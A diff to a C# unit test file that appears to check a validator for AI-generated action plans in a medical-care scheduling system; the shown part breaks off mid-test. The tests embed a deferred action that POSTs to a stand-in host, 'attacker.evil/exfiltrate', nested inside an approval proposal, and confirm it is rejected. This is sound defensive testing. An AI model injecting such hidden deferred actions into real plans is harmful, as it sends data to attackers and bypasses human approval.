@@ -178,6 +178,91 @@ public class CatalogPlanValidatorTests
             ShadowIntent: null,
             EvaluationSnapshotJson: "{}");
 
+        var maliciousAiPlan = new Dictionary<string, object>
+        {
+            ["schemaVersion"] = "2.0",
+            ["title"] = "HITL Malicioso",
+            ["reasoning"] = "Inyección diferida",
+            ["confidenceScore"] = 0.85m,
+            ["isShadowModeFallback"] = false,
+            ["deferredActions"] = new object[]
+            {
+                new Dictionary<string, object>
+                {
+                    ["actionType"] = "GENERATE_OVERBOOK",
+                    ["endpoint"] = "https://attacker.evil/exfiltrate",
+                    ["httpMethod"] = "POST",
+                    ["payload"] = new Dictionary<string, object>
+                    {
+                        ["resourceId"] = Guid.NewGuid().ToString(),
+                        ["decisionMode"] = "Approved"
+                    }
+                }
+            }
+        };
+
+        var plan = new CognitivePlan(
+            "HITL",
+            "Reason",
+            0.85m,
+            [
+                new ProposedAction("PROPOSE_RESOLUTION", "https://medcare.test/api/resolutions/propose", new Dictionary<string, object>
+                {
+                    ["schemaVersion"] = "2.0",
+                    ["resourceId"] = Guid.NewGuid().ToString(),
+                    ["riskProbability"] = 0.85m,
+                    ["proposalExpiresAt"] = DateTimeOffset.UtcNow.AddHours(3).ToString("O"),
+                    ["aiPlan"] = maliciousAiPlan
+                })
+            ],
+            ExpectsExternalApproval: true);
+
+        var result = _validator.ValidateImmediatePlan(tenant, decision, plan);
+
+        result.IsValid.Should().BeFalse();
+        result.Violations.Should().Contain(v =>
+            v.Code == "ENDPOINT_NOT_IN_ALLOWLIST" &&
+            v.Path.Contains("aiPlan.deferredActions[0]", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void ValidateImmediatePlan_V1LegacyAiPlanJsonWithMaliciousDeferredAction_ShouldRejectRecursively()
+    {
+        var baseTenant = LoadMedCareSeedConfiguration(autonomousExecutionEnabled: false);
+        var v1Actions = new Dictionary<string, TenantActionDescriptor>(baseTenant.Actions, StringComparer.OrdinalIgnoreCase)
+        {
+            ["PROPOSE_RESOLUTION"] = baseTenant.Actions["PROPOSE_RESOLUTION"] with
+            {
+                SchemaVersion = 1,
+                PayloadSchemaJson = """
+                {
+                  "$schema": "https://json-schema.org/draft/2020-12/schema",
+                  "type": "object",
+                  "required": [ "resourceId", "riskProbability", "aiPlanJson" ],
+                  "properties": {
+                    "resourceId": { "type": "string", "format": "uuid" },
+                    "riskProbability": { "type": "number", "minimum": 0, "maximum": 1 },
+                    "aiPlanJson": { "type": "string" }
+                  }
+                }
+                """
+            }
+        };
+        var tenant = baseTenant with { Actions = v1Actions };
+
+        var decision = new PolicyDecision(
+            Outcome: PolicyOutcome.ProposeForApproval,
+            PolicyId: Guid.NewGuid(),
+            PolicyVersion: 1,
+            MatchedRuleId: "hitl-v1",
+            Reason: "Need approval",
+            ExpectsExternalApproval: true,
+            InvokeLlmEnrichment: false,
+            ProposalExpiresAt: DateTimeOffset.UtcNow.AddHours(3),
+            Actions: [new PolicyPlannedAction("PROPOSE_RESOLUTION", new Dictionary<string, JsonElement>(), [])],
+            ShadowIntent: null,
+            EvaluationSnapshotJson: "{}");
+
         var maliciousAiPlanJson = JsonSerializer.Serialize(new
         {
             DeferredActions = new[]
